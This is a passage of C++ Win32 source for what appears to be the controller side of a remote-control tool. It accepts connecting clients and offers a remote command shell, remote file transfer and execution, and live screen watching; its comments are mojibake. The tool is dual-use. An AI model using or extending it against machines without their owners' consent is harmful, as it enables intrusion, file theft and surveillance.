// ��������.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "shellapi.h"
#include "stdio.h"
#include "windows.h"
#include "commctrl.h"
#include "Winsock2.h"
#include "resource.h"
#include "NetMsg.h"
#include "My API.h"
#include "My minilzo.h"
#include "Commdlg.h"
#include "SkinPPWTL.h"
//�ͻ���������Ϣ
#define WM_CLIENTON	WM_USER+1
#define WM_NETMSG	WM_USER+2

#pragma comment(lib,"ws2_32.lib")
//ͨ�ÿؼ���
#pragma comment(lib,"comctl32.lib")
//Ƥ����
#pragma comment(lib,"SkinPPWTL.lib")

typedef struct net_msg
{
	DWORD dwCommand;//��������
	WPARAM wParam;//w����
	LPARAM lParam;//l����
	DWORD extra[20];//����Ĳ���
}NETMSG,*PNETMSG;
//��Ļ��ط�Χ
struct mon_rect
{
	DWORD  x;//���ӵ�x����
	DWORD  y;//���ӵ�y����
	DWORD  width;//���ӵĿ��
	DWORD  height;//���ӵĸ߶�
}MonRect;

int NetPort[4]={4501,4502,4503,4504};//˳��Ϊcmd��file��img,fileS

SOCKET NetSock[4];//˳��Ϊcmd��file��img,fileS

HINSTANCE	hInst;
DWORD		pBitMap,ClientScrX,ClientScrY,ClientBitsPixel,nSize;
HBITMAP		 hBit;
HDC			hCdc;
HTREEITEM hCurSelItem;
HANDLE	hThreadImg,hThreadFile;
HWND		hDlgMain,hDlgChat,hDlgCmd,hDlgFile,hDlgFileS,hOutInfo,hWinMon,hTreeC,hListC;
SOCKET		SockChat,SockCmd,SockFile,SockFileS;
RECT	rect;
char 	pRawData[1024];//1kb�Ļ�����
char	szDownDir[MAX_PATH];//�ļ�����Ŀ¼
char	szPort[10];//�˿ںŵ��ַ�����ʽ
int		ListIndex,CurSelIndex,fSize;

//����ı����༭��ĩβ
BOOL AddTextToEdit(HWND hEdit,char *szTxt,BOOL bNextLine)
{
	static char NextLine[]={13,10,0};

	SendMessage(hEdit,EM_SETSEL,-2,-1);
	SendMessage(hEdit,EM_REPLACESEL,0,(long)szTxt);
	if(bNextLine)
		SendMessage(hEdit,EM_REPLACESEL,0,(long)NextLine);
	return 1;
}
//�����ļ��������չ�ļ��� �ַ�������
void GetFileTypeSz(char *pszFile,char *pszExp)
{
	char *p;
	p=pszFile;
	while((*p)!='.')
	{
		p++;
		if(*p==0)
			return;
	}
	p++;
	lstrcpy(pszExp,p);
	GetFileTypeSz(p,pszExp);//�ݹ���ã��ҳ����һ����չ��
}
//Ϊ�б���ͼ�ؼ����һ����Ŀ/����Ŀ
BOOL AddListVeiwItem(HWND hList,int ItemIndex,int SubItemIndex,char *pszText)
{
	char str[MAX_PATH]={0};
	LVITEM lvi;
	ZeroMemory(&lvi,sizeof(lvi));
	lvi.mask=LVIF_TEXT;
	lvi.iItem=ItemIndex;
	lvi.cchTextMax=MAX_PATH;

	lvi.pszText=pszText;
	lvi.iSubItem=SubItemIndex;
	return SendMessage(hList,LVM_INSERTITEM,0,(long)&lvi);
}
//�༭�б���ͼ�ؼ���һ����Ŀ/����Ŀ
BOOL SetListVeiwItem(HWND hList,int ItemIndex,int SubItemIndex,char *pszText)
{
	char str[MAX_PATH]={0};
	LVITEM lvi;
	ZeroMemory(&lvi,sizeof(lvi));
	lvi.mask=LVIF_TEXT;
	lvi.iItem=ItemIndex;
	lvi.cchTextMax=MAX_PATH;

	lvi.pszText=pszText;
	lvi.iSubItem=SubItemIndex;
	return SendMessage(hList,LVM_SETITEM,0,(long)&lvi);
}
//��������ͼ�ؼ���һ����Ŀ�������Ŀ
void AddChildItem(HWND hTree,HTREEITEM hParent,char *pszText)
{
	TVINSERTSTRUCT ti;
	ZeroMemory(&ti,sizeof(ti));
	ti.item.mask=TVIF_TEXT|TVIF_HANDLE;
	ti.hParent=hParent;
	ti.hInsertAfter =TVI_LAST;
	ti.item.pszText=pszText;

	SendMessage(hTree,TVM_INSERTITEM,0,(long)&ti);
}
//���ļ��б���ӵ��б���ͼ�ؼ�������������Ч��
void AddFileList(HWND hList,PWIN32_FIND_DATA pwfd)
{
	char str[MAX_PATH]={0};
	double size;
	LVITEM lvi;
	ZeroMemory(&lvi,sizeof(lvi));
	lvi.mask=LVIF_TEXT;
	lvi.iItem=ListIndex;
	lvi.cchTextMax=MAX_PATH;

	lvi.pszText=pwfd->cFileName;
	lvi.iSubItem=0;
	SendMessage(hList,LVM_INSERTITEM,0,(long)&lvi);

	lvi.pszText=str;
	if(pwfd->dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY)
	{
		//������ļ���
		AddChildItem(hTreeC,hCurSelItem,pwfd->cFileName);

		lstrcpy(str,"�ļ���");
		lvi.iSubItem=1;
		SendMessage(hList,LVM_SETITEM,0,(long)&lvi);
	}
	else
	{
		GetFileTypeSz(pwfd->cFileName,str);
		lstrcat(str,"�ļ�");
		lvi.iSubItem=1;
		SendMessage(hList,LVM_SETITEM,0,(long)&lvi);

		if(pwfd->nFileSizeLow>1024)wsprintf(str,"%u KB",pwfd->nFileSizeLow/1024);
		else wsprintf(str,"%u Byte",pwfd->nFileSizeLow);
		lvi.iSubItem=2;
		SendMessage(hList,LVM_SETITEM,0,(long)&lvi);
	}

	ListIndex++;
}
//�õ�������ͼ�ؼ�һ����Ŀ���ı�
int GetTreeItemText(HWND hTree,HTREEITEM hItem,char *pszText)
{
	TVITEMEX tvi;
	tvi.mask=TVIF_TEXT|TVIF_HANDLE;
	tvi.hItem=hItem;
	tvi.pszText=pszText;
	tvi.cchTextMax=MAX_PATH;
	int b;

	b=TreeView_GetItem(hTree,&tvi);
	//SendMessage(hTree,TVM_GETITEM,0,(long)&tvi);
	return lstrlen(pszText);
}
//���������ͼ�ؼ�ĳһ��Ŀ������Ŀ
void CleanTreeItem(HWND hTree,HTREEITEM hPItem)
{
	HTREEITEM hItem;
	
a:	hItem=(HTREEITEM)SendMessage(hTree,TVM_GETNEXTITEM,TVGN_CHILD,(long)hPItem);
	if(hItem)
	{
		SendMessage(hTree,TVM_DELETEITEM,0,(long)hItem);
		goto a;
	}
}
//����б���ͼ�ؼ�����Ŀ
void CleanListItem(HWND hList)
{
	SendMessage(hList,LVM_DELETEALLITEMS,0,0);
}
//���б���ͼ�ؼ��ĸ�����Ŀ�ı��á�\�����ӳ�·������ʽ
int GetWholePath(HWND hTree,HTREEITEM hCurSel,char *pszPath)
{ 
	int nPathLen=0;
	char szBuf[MAX_PATH]={0};
	HTREEITEM hParent;

	//����Ŀ�ļ�������Ŀ���ı�
	nPathLen+=GetTreeItemText(hTree,hCurSel,szBuf);
	lstrcat(szBuf,"\\");
	lstrcat(szBuf,pszPath);
	lstrcpy(pszPath,szBuf);
	hParent=(HTREEITEM)SendMessage(hTree,TVM_GETNEXTITEM,TVGN_PARENT,(long)hCurSel);
	if(hParent)
	{		
		//�ݹ����
		nPathLen+=GetWholePath(hTree,hParent,pszPath);
	}
	return nPathLen+1;
}
//�õ�ListVeiwָ����Ŀ���ı�
void GetListItemText(HWND hList,char *pszText,int ItemIndex,int SubIndex)
{
	LVITEM lvi;
	ZeroMemory(&lvi,sizeof(lvi));
	lvi.mask=LVIF_TEXT;
	lvi.iItem=ItemIndex;
	lvi.iSubItem=SubIndex;
	lvi.pszText=pszText;
	lvi.cchTextMax=MAX_PATH;

	SendMessage(hList,LVM_GETITEM,0,(long)&lvi);
}
//ͨ��GetWholePath���Ŀ¼·�����ٻ���б���ͼ�е��ļ��������ӳ��ļ�·��
int GetFilePath(char *pszPath)
{
	char str[MAX_PATH];
	(*pszPath)=0;

	GetListItemText(hListC,str,CurSelIndex,0);
	GetWholePath(hTreeC,hCurSelItem,pszPath);
	lstrcat(pszPath,str);
	return lstrlen(str);
}
//���ز˵����
HMENU InitPopupMenu()
{
	HMENU hMenu=CreatePopupMenu();
	AppendMenu(hMenu,0,IDM_DOWNFILE,"����");
	AppendMenu(hMenu,0,IDM_UPFILE,"�ϴ�");
	AppendMenu(hMenu,0,IDM_DELFILE,"ɾ��");
	AppendMenu(hMenu,0,IDM_RENAMEFILE,"������");
	AppendMenu(hMenu,0,IDM_NEWFLODER,"�½��ļ���");
	AppendMenu(hMenu,0,IDM_EXECUTE,"Զ��ִ��");
	return hMenu;
}
//���Ŀ���������б�
void AddDriverToTree(DWORD dwDriverInfo)
{
	DWORD dwIndex;
	BOOL b;
	char Index;
	char ch[4]={'A',':',0};
	
	for(Index=0;Index<=25;Index++)
	{
		dwIndex=1;
		dwIndex=dwIndex<<Index;
		b=dwIndex&dwDriverInfo;
		if(b)
		{
			ch[0]='A'+Index;
			AddChildItem(hTreeC,NULL,ch);
		}
	}
}
//��ʼ��ͼ���ļ���CMD�����׽���
void InitSocket()
{
	WSADATA wsaData;
	int i; 

	if(WSAStartup(MAKEWORD(2,2),&wsaData))
		AddTextToEdit(hOutInfo,"WinSock��ʼ��ʧ��",1);

	for(i=0;i<=3;i++)
	{
		NetSock[i]=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		sockaddr_in sin;
		sin.sin_family = AF_INET;
		sin.sin_addr.S_un.S_addr =INADDR_ANY;
		sin.sin_port = htons(NetPort[i]);
		// ʹ�׽��ֺͱ��ص�ַ��
		if(bind(NetSock[i], (LPSOCKADDR)&sin, sizeof(sin)) == SOCKET_ERROR)
		{
			NetPort[i]++;
		}
		listen(NetSock[i], 5);
	}
}

HANDLE MyCreateFile(char *szFile,DWORD dwCreationDisposition)
{
	return CreateFile(szFile,GENERIC_ALL,FILE_SHARE_READ,NULL,
		dwCreationDisposition,FILE_ATTRIBUTE_NORMAL,NULL);
}
//�ļ��ϴ��߳�
DWORD WINAPI FileThreadS(LPVOID lpParameter)
{
	char buf[102400];
	char *pBuf;
	DWORD dw;
	int ret;
	HANDLE hFile=lpParameter;
	int b;

	sockaddr_in remoteAddr; 
    int nAddrLen = sizeof(remoteAddr);
	// ����һ��������

	SockFileS = accept(NetSock[3], (SOCKADDR*)&remoteAddr, &nAddrLen);
	AddTextToEdit(hOutInfo,"�ļ��ϴ����ӳɹ���",1);
	Sleep(100);
	while(TRUE)
	{
		ReadFile(hFile,buf,102400,&dw,0);
		if(dw)
		{
			send(SockFileS,buf,dw,0);
			PostMessage(hDlgFileS,WM_MSG,FT_DATALEN,dw);
		}
		else
		{
			PostMessage(hDlgFileS,WM_MSG,FT_FILEEND,0);
			closesocket(SockFileS);
			return 0;
		}
		Sleep(50);
	}
	return 0;
}
//�ļ������߳�
DWORD WINAPI FileThread(LPVOID lpParameter)
{
	char buf[102400];
	char *pBuf;
	DWORD dw;
	int ret;
	HANDLE hFile=lpParameter;
	int b=0;

	sockaddr_in remoteAddr;
    int nAddrLen = sizeof(remoteAddr);
	// ����һ��������
	SockFile = accept(NetSock[1], (SOCKADDR*)&remoteAddr, &nAddrLen);
	AddTextToEdit(hOutInfo,"�ļ��������ӳɹ���",1);
	while(TRUE)
	{
		ret=recv(SockFile,(char *)buf,102400,0);
		if(ret>0)
		{
			WriteFile(hFile,buf,ret,&dw,0);
			PostMessage(hDlgFile,WM_MSG,FT_DATALEN,ret);
		}
		else if(ret==0)
		{
			PostMessage(hDlgFile,WM_MSG,FT_FILEEND,NULL);
			return 0;
		}
		else if(ret==SOCKET_ERROR)
		{
			AddTextToEdit(hOutInfo,"�ļ����������жϣ�",1);
			return 0;
		}
	}
	return 0;
}

BOOL OpenFileDlg(HWND hWnd,char *szFilter,char *pszFile,char *pszName)
{
	OPENFILENAME of;

	ZeroMemory(&of,sizeof(of));
	ZeroMemory(pszFile,MAX_PATH);
	of.lStructSize=sizeof(of);
	of.hwndOwner=hWnd;
	of.lpstrFilter=szFilter;
	of.lpstrFile=pszFile;
	of.lpstrFileTitle=pszName;
	of.nMaxFileTitle=MAX_PATH;
	of.nMaxFile=MAX_PATH;
	of.Flags=OFN_FILEMUSTEXIST|OFN_PATHMUSTEXIST;
	return GetOpenFileName(&of);
}
//�ļ��ϴ�
int CALLBACK ProcDlgFileS(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	static int len,size;
	int num;
	DWORD ThreadId;
	char str[MAX_PATH];
	char szFile[MAX_PATH];
	static HANDLE hFileS;
	PNETMSG nMsg=(PNETMSG)pRawData;
	static HANDLE hThreadFileS;

	switch(message)
	{
	case WM_INITDIALOG:
		SetWindowText(hwnd,"�ļ��ϴ� ");
		if(OpenFileDlg(hwnd,"�����ļ�\0*.*\0",szFile,str))
		{
			hDlgFileS=hwnd;len=0;
			SetDlgItemText(hwnd,IDC_FILEPATH,szFile);
			hFileS=CreateFile(szFile,GENERIC_READ,FILE_SHARE_READ,NULL,
					OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
			size=GetFileSize(hFileS,NULL);SetDlgItemInt(hwnd,IDC_SIZE,size,0);
			nMsg->dwCommand=FT_SIZE;
			nMsg->wParam=size;
			send(SockChat,pRawData,8,0);
			//�ļ����ݴ����߳�
			hThreadFileS=CreateThread(NULL,NULL,FileThreadS,hFileS,NULL,&ThreadId);
			ZeroMemory(pRawData,256);
			nMsg->dwCommand=IDM_UPFILE;
			GetWholePath(hTreeC,hCurSelItem,pRawData+4);
			lstrcat(pRawData+4,str);
			send(SockChat,pRawData,MAX_PATH+4,0);
		}
		else
			EndDialog(hwnd,0);
		break;
	case WM_MSG:
		switch(wParam)
		{
		case FT_DATALEN:
			len+=lParam;
			SetDlgItemInt(hwnd,IDC_LEN,len,0);
			num=(len*100)/size;//��ʾ�ٷֱ�
			SetDlgItemInt(hwnd,IDC_NUM,num,0);
			break;
		case FT_LASTFAIL:
			MessageBox(hwnd,"�ͻ����ļ�����ʧ�ܣ�","��ʾ",MB_OK);
			CloseHandle(hFileS);
			EndDialog(hwnd,0);
			break;
		case FT_FILEEND:
			nMsg->dwCommand=FT_FILEEND;
			send(SockChat,pRawData,4,0);
			MessageBox(hwnd,"�ϴ���ɣ�","��ʾ",MB_OK);
			EndDialog(hwnd,0);
			break;
		}
		break;
	case WM_CLOSE:
		if(MessageBox(hwnd,"ȷ�Ϸ����ϴ���","��ʾ",MB_OKCANCEL)!=IDCANCEL)
		{
			CloseHandle(hFileS);
			TerminateThread(hThreadFileS,0);
			EndDialog(hwnd,0);
		}
		break;
	default:
		return 0;
	}
	return 1;
}
//�ļ�����
int CALLBACK ProcDlgFile(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	static int len,size;
	int num;
	DWORD ThreadId;
	static char str[MAX_PATH];
	char szFile[MAX_PATH];
	static HANDLE hFile;
	PNETMSG nMsg=(PNETMSG)pRawData;
	static HANDLE hThreadFile;

	switch(message)
	{
	case WM_INITDIALOG:
		SetWindowText(hwnd,"�ļ����� ");
		hDlgFile=hwnd;len=0;
		if(lParam)//����Ǵ�������ļ�
		{
			lstrcpy(str,(const char *)lParam);
		}
		else
		{
			GetListItemText(hListC,szFile,CurSelIndex,0);
			lstrcpy(str,szDownDir);
			lstrcat(str,szFile);
		}
		
		hFile=CreateFile(str,GENERIC_WRITE,FILE_SHARE_READ,NULL,
			OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
		if(hFile==INVALID_HANDLE_VALUE)MessageBox(hwnd,"�����ļ�����ʧ��","��ʾ",MB_OK);
		SetDlgItemText(hwnd,IDC_FILEPATH,str);
		//�ļ����ݴ����߳�
		hThreadFile=CreateThread(NULL,NULL,FileThread,hFile,NULL,&ThreadId);
		if(lParam)//����Ǵ�������ļ�
		{
			nMsg->dwCommand=IDM_CAPSCR;
			send(SockChat,pRawData,4,0);
		}
		else
		{
			nMsg->dwCommand=IDM_DOWNFILE;
			GetFilePath(str);
			lstrcpy(pRawData+4,str);
			send(SockChat,pRawData,MAX_PATH+4,0);
		}
		break;
	case WM_MSG:
		switch(wParam)
		{
		case FT_DATALEN:		
			len+=lParam;
			SetDlgItemInt(hwnd,IDC_LEN,len,0);
			num=(len*100)/size;//��ʾ�ٷֱ�
			SetDlgItemInt(hwnd,IDC_NUM,num,0);
			break;
		case FT_LASTFAIL:
			MessageBox(hwnd,"�ͻ����ļ���ʧ�ܣ�","��ʾ",MB_OK);
			CloseHandle(hFile);
			EndDialog(hwnd,0);
			break;
		case FT_FILEEND:
			CloseHandle(hFile);
			EndDialog(hwnd,0);
			ShellExecute(NULL,"open",str,0,0,SW_NORMAL);
			MessageBox(hwnd,"�ļ�������ϣ�","��ʾ",MB_OK);
			break;
		case FT_SIZE:
			size=lParam;
			fSize=size;
			SetDlgItemInt(hwnd,IDC_SIZE,size,0);
			break;
		}
		break;
	case WM_CLOSE:
		if(MessageBox(hwnd,"ȷ�Ϸ�������","��ʾ",MB_OKCANCEL)!=IDCANCEL)
		{
			GetDlgItemText(hwnd,IDC_FILEPATH,str,MAX_PATH);
			DeleteFile(str);
			CloseHandle(hFile);
			TerminateThread(hThreadFile,0);
			nMsg->dwCommand=FT_FILEBREAK;
			send(SockChat,pRawData,4,0);
			EndDialog(hwnd,0);
		}
		break;
	default:
		return 0;
	}
	return 1;
}

int CALLBACK ProcDlgConfig (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	static HKEY hConfigKey;
	DWORD dwData;
	PNETMSG nMsg=(PNETMSG)pRawData;
	char NextLine[]={13,10,0};
	char str[MAX_PATH];
	int len;

	switch(message)
	{
	case WM_INITDIALOG:
		SetWindowText(hwnd,"YKServer Config");
		//����ԭ����
		AppCreateKey(HKEY_LOCAL_MACHINE,"SoftWare\\YKConfig",&hConfigKey);
		RegQueryValueEx(hConfigKey,"DownDir",0,NULL,(LPBYTE)str,&dwData);
		SetDlgItemText(hwnd,IDC_DOWNDIR,str);
		RegQueryValueEx(hConfigKey,"Port",0,NULL,(LPBYTE)str,&dwData);
		SetDlgItemText(hwnd,IDC_PORT,str);
		break;
	case WM_COMMAND:
		switch(LOWORD(wParam))
		{
		case IDOK:
			//�������ò��˳�
			GetDlgItemText(hwnd,IDC_DOWNDIR,str,MAX_PATH);
			RegSetValueEx(hConfigKey,"DownDir",0,REG_SZ,(LPBYTE)str,6);
			GetDlgItemText(hwnd,IDC_PORT,str,MAX_PATH);
			RegSetValueEx(hConfigKey,"Port",0,REG_SZ,(LPBYTE)str,6);
		case IDCANCEL:
			EndDialog(hwnd,0);
			break;
		}
		break;
	case WM_CLOSE:
		EndDialog(hwnd,0);
		break;
	default:
		return 0;
	}
	return 1;
}

int CALLBACK ProcDlgChat (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	HWND hShow;
	PNETMSG nMsg=(PNETMSG)pRawData;
	char NextLine[]={13,10,0};
	int len;

	switch(message)
	{
	case WM_INITDIALOG:
		hDlgChat=hwnd;
		SetWindowText(hwnd,"Chat");
		if(lParam)
			PostMessage(hwnd,WM_MSG,0,0);
		break;
	case WM_COMMAND:
		switch(LOWORD(wParam))
		{
		case IDOK:
			nMsg->dwCommand=NETMSG_CHAT;					//����ͷ
			len=GetDlgItemText(hwnd,IDC_EDIT,(char *)(pRawData+4),1024);
			hShow=GetDlgItem(hwnd,IDC_SHOW);
			AddTextToEdit(hShow,"Server:",1);
			AddTextToEdit(hShow,(pRawData+4),1);
			send(SockChat,pRawData,len*2+5,0);
			SetDlgItemText(hwnd,IDC_EDIT,0);
			break;
		}
		break;
	case WM_MSG:
		hShow=GetDlgItem(hwnd,IDC_SHOW);
		AddTextToEdit(hShow,"Client:",1);
		AddTextToEdit(hShow,(pRawData+4),1);
		break;
	case WM_CLOSE:
		ShowWindow(hwnd,SW_HIDE);
		break;
	default:
		return 0;
	}
	return 1;
}

DWORD WINAPI CmdThread(LPVOID lpParameter)
{
	char str1[5*1024]={0};
	char str2[2*1024]={0};

	sockaddr_in remoteAddr; 
    int nAddrLen = sizeof(remoteAddr);
	// ����һ��������
a:	SockCmd=accept(NetSock[0], (SOCKADDR*)&remoteAddr, &nAddrLen);
	AddTextToEdit(hOutInfo,"CMD�������ӳɹ���",1);
	while(TRUE)
	{
		ZeroMemory(str1,2*1024);
		int ret=recv(SockCmd,str1,5*1024,0);
        if(ret>0)
		{
			AddTextToEdit(GetDlgItem(hDlgCmd,IDC_CMDSHOW),str1,0);
		}
		else if(ret==0)
			goto a;
	}
	return 0;
}

int CALLBACK ProcDlgCmd(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	DWORD ThreadId;
	PNETMSG nMsg=(PNETMSG)pRawData;
	static HANDLE hThread;
	char str[1024];
	char NextLine[]={13,10,13,10};
	int len;

	switch(message)
	{
	case WM_INITDIALOG:
		hDlgCmd=hwnd;
		//���߳�ר������CMD��������Ϣ
		hThread=CreateThread(NULL,NULL,CmdThread,hwnd,NULL,&ThreadId);
		SetWindowText(hwnd,"CmdShell");
		Sleep(100);
		nMsg->dwCommand=NETMSG_CMD;
		send(SockChat,pRawData,4,0);
		break;
	case WM_COMMAND:
		switch(LOWORD(wParam))
		{
		case IDOK:
			len=GetDlgItemText(hwnd,IDC_CMDIN,str,1024);
			send(SockCmd,str,len*2,0);
			send(SockCmd,NextLine,4,0);
			//send(SockCmd,NextLine,4,0);
			AddTextToEdit(GetDlgItem(hwnd,IDC_CMDSHOW),str,1);
			SetDlgItemText(hwnd,IDC_CMDIN,0);
			break;
		}
		break;
	case WM_CLOSE:
		closesocket(SockCmd);
		TerminateThread(hThread,0);
		nMsg->dwCommand=NETMSG_CMDEND;
		send(SockChat,pRawData,4,0);
		EndDialog(hwnd,0);
		break;
	default:
		return 0;
	}
	return 1;
}

DWORD WINAPI ImageThread(LPVOID lpParameter)
{	
	HDC    hdc;
	static HBITMAP hBitMap;
	BITMAPINFO bmi;
	PNETMSG nMsg=(PNETMSG)pRawData;
	char str[20];
	unsigned char *pRecvData;
	unsigned long size;

		  //��ʼ����ͼ����
		  hdc=GetDC(hWinMon);
		  //����Ӧ�ó������ֱ��д��ġ����豸�޹ص�λͼ��DIB��
		  ZeroMemory(&bmi,sizeof(BITMAPINFO));
		  //bmi.bmiHeader.biSize=sizeof(BITMAPINFOHEADER);
		  //GetDIBits(hCdc,hBitMap,0,0,NULL,&bmi,DIB_RGB_COLORS);
		  bmi.bmiHeader.biSize=sizeof(BITMAPINFOHEADER);
		  bmi.bmiHeader.biBitCount =ClientBitsPixel;
		  bmi.bmiHeader.biHeight=ClientScrY;
		  bmi.bmiHeader.biWidth =ClientScrX;
		  bmi.bmiHeader.biPlanes=1;
		  hBit=CreateDIBSection(hdc,&bmi,DIB_RGB_COLORS,(void **)(&pBitMap),NULL,0);
		  hCdc=CreateCompatibleDC(hdc);
		  SelectObject(hCdc,hBit);
		  //����һ���ڴ��ļ�ӳ��
		  //CreateFileMapping(INVALID_HANDLE_VALUE,NULL,PAGE_READWRITE,0,4*1024*1024,
		  ReleaseDC(hWinMon,hdc);

	sockaddr_in remoteAddr; 
	SOCKET sClient;
    int nAddrLen = sizeof(remoteAddr);
	// ����һ��������
a:	sClient = accept(NetSock[2], (SOCKADDR*)&remoteAddr, &nAddrLen);
	AddTextToEdit(hOutInfo,"ͼ�������ӳɹ���",1);
	pRecvData=(unsigned char *)GlobalAlloc(GMEM_FIXED|GMEM_ZEROINIT,3*1024*1024);//ע��������ڴ�Ҫ�㹻�󣡣�����
	if(pRecvData==NULL)
		MessageBox(NULL,"�ڴ����ʧ��","��ʾ",MB_OK);
	int ret;
	lzo_init();//��ʼ��minilzoѹ����
	while(TRUE)
	{
		ret=recv(sClient,(char *)pRecvData,1024*1024,0);
		//nSize=ClientScrY*ClientScrX*ClientBitsPixel/8;
		//ret=recv(sClient,(char *)pBitMap,nSize,0);
        if(ret>0)
		{
			nSize=ClientScrY*ClientScrX*ClientBitsPixel/8;
			lzo1x_decompress_safe(pRecvData,ret,(unsigned char *)pBitMap,&nSize,NULL);
			InvalidateRect(hWinMon,&rect,0);
		}
		else if(ret==0)
		{
			closesocket(sClient);
			goto a;
		}
	}
	return 0;
}

DWORD WINAPI ChatThread(LPVOID lpParameter)
{
	DWORD dwThreadId;
	WSADATA wsaData;
	SOCKET	ChatSock;
	char str[50];
	sockaddr_in remoteAddr; 
	int nAddrLen = sizeof(remoteAddr);

	if(WSAStartup(MAKEWORD(2,2),&wsaData))
		MessageBox(NULL,"��ʼ��ʧ��","Message",MB_OK);
	ChatSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);	
	if(ChatSock == INVALID_SOCKET)
	{
		AddTextToEdit(hOutInfo,"�׽��ֽ���ʧ��",1);
	}
	
	sockaddr_in ChatSin;
	ChatSin.sin_family = AF_INET;
	ChatSin.sin_port = htons(4500);
	ChatSin.sin_addr.S_un.S_addr =INADDR_ANY;
	// ʹ�׽��ֺͱ��ص�ַ��
	if(bind(ChatSock, (LPSOCKADDR)&ChatSin, sizeof(ChatSin)) == SOCKET_ERROR)
	{
		AddTextToEdit(hOutInfo,"�󶨶˿�ʧ��",1);
		return 0;
	}
	// �����׽��ֽ������ģʽ
	if(listen(ChatSock, 5) == SOCKET_ERROR)
	{
		AddTextToEdit(hOutInfo,"����ʧ��",1);
		return 0;
	}
	AddTextToEdit(hOutInfo,"���ڵȴ��ͻ�������...",1);
	// ����һ��������
d:	SockChat = accept(ChatSock, (SOCKADDR*)&remoteAddr, &nAddrLen);
	wsprintf(str,"�ͻ������ߣ�IP��%s���˿ںţ�%d",inet_ntoa(remoteAddr.sin_addr),remoteAddr.sin_port);
	AddTextToEdit(hOutInfo,str,1);
	PostMessage(hDlgMain,WM_CLIENTON,0,0);//���������ڿͻ���������
	while(TRUE)
	{
		int ret=recv(SockChat,(char *)pRawData,1024,0);
		if(ret>0)
			PostMessage(hDlgMain,WM_NETMSG,0,0);
		else if(ret==SOCKET_ERROR)
		{
			AddTextToEdit(hOutInfo,"��ͻ���ʧȥ���ӣ�",1);
			CleanTreeItem(hTreeC,NULL);
			CleanListItem(hListC);
			wsprintf(str,"ret����ֵ��%d",ret);
			AddTextToEdit(hOutInfo,str,1);
			goto d;//�ȴ��ͻ����ٴ�����
		}
	}
	return 0;
}

LRESULT CALLBACK WndProcMon (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
     HDC    hdc;
	 static HBITMAP hBitMap;
	 static BOOL fFullScr=1;
	 long style;
	 static long Ostyle;
	 int screenX,screenY;
     PAINTSTRUCT ps ;
	 SCROLLINFO si;
	 static RECT scrrt;
	 PNETMSG nMsg=(PNETMSG)pRawData;
	 int iHorzPos,iVertPos,cxChar=10,cyChar=10;
     
     switch (message)
     {
	 case WM_CREATE:
		  ResumeThread(hThreadImg);
		  nMsg->dwCommand=IDM_STARTMON;//���߿ͻ��˿�ʼ����ͼ����
		  send(SockChat,pRawData,4,0);
		  GetClientRect(hwnd,&rect);
		  break;
     case WM_SIZE:
		  GetClientRect(hwnd,&rect);
		  //���ù������Ĵ�С
		  si.cbSize=sizeof(si);
		  si.fMask=SIF_ALL;
		  GetScrollInfo(hwnd,SB_HORZ,&si);
		  si.nMax=ClientScrX-rect.right-rect.left;
		  SetScrollInfo(hwnd,SB_HORZ,&si,TRUE);

		  GetScrollInfo(hwnd,SB_VERT,&si);
		  si.nMax=ClientScrX-rect.bottom-rect.top;
		  SetScrollInfo(hwnd,SB_VERT,&si,TRUE);
     case WM_PAINT:
          hdc=BeginPaint (hwnd, &ps) ;
		  BitBlt(hdc,0,0,ClientScrX,ClientScrY,hCdc,MonRect.x,MonRect.y,SRCCOPY);
          EndPaint (hwnd, &ps) ;
          break;
	 case WM_HSCROLL:
		 si.cbSize=sizeof(si);
		 si.fMask=SIF_ALL;
		 GetScrollInfo(hwnd,SB_HORZ,&si);

		 iHorzPos=si.nPos;
		 switch(LOWORD(wParam))
		 {
		 case SB_TOP:
			 si.nPos=si.nMin;
			 break;
		 case SB_BOTTOM:
			 si.nPos=si.nMax;
			 break;
		 case SB_LINELEFT:
			 si.nPos-=1;
			 break;
		 case SB_LINERIGHT:
			 si.nPos+=1;
			 break;
		 case SB_THUMBPOSITION:
			 si.nPos=si.nTrackPos;
			 break;
		 default:
			 break;
		 }
		 SetScrollInfo(hwnd,SB_HORZ,&si,TRUE);
		 MonRect.x=si.nPos;
	 case WM_VSCROLL:
		 si.cbSize=sizeof(si);
		 si.fMask=SIF_ALL;
		 GetScrollInfo(hwnd,SB_VERT,&si);

		 iVertPos=si.nPos;
		 switch(LOWORD(wParam))
		 {
		 case SB_TOP:
			 si.nPos=si.nMin;
			 break;
		 case SB_BOTTOM:
			 si.nPos=si.nMax;
			 break;
		 case SB_LINEUP:
			 si.nPos-=1;
			 break;
		 case SB_LINEDOWN:
			 si.nPos+=1;
			 break;
		 case SB_THUMBTRACK:
			 si.nPos=si.nTrackPos;
			 break;
		 default:
			 break;
		 }
		 SetScrollInfo(hwnd,SB_VERT,&si,TRUE);
		 MonRect.y=si.nPos;
		 break;
	 case WM_KEYDOWN:
		 switch(wParam)
		 {
		 case VK_F12:
			 if(fFullScr)
			 {
				 //����ԭ������Ϣ
				 GetWindowRect(hwnd,&scrrt);
				 //ȫ��
				 Ostyle = GetWindowLong(hwnd,GWL_STYLE);//��ô��ڷ��   
				 ShowScrollBar(hwnd,SB_VERT,0);//���ع�����
				 style =Ostyle &~WS_CAPTION & ~WS_SIZEBOX;//����ȫ����ʾ�Ҳ��ɸı��С   
				 SetWindowLong(hwnd,GWL_STYLE,style); //���ô��ڷ��   
				 screenX = GetSystemMetrics(SM_CXSCREEN);//��ȡ������Ļ���½�X����   
				 screenY = GetSystemMetrics(SM_CYSCREEN);//��ĻY����   
				 SetWindowPos(hwnd, NULL,0,0,screenX,screenY,SWP_NOZORDER);//�ı䴰��λ�á��ߴ��Z��   
				 //ShowCursor(FALSE);//��ʾʱ�������  

			 }
			 else
			 {
				 //�˳�ȫ��   
				 SetWindowLong(hwnd,GWL_STYLE,Ostyle); //���ô��ڷ��   
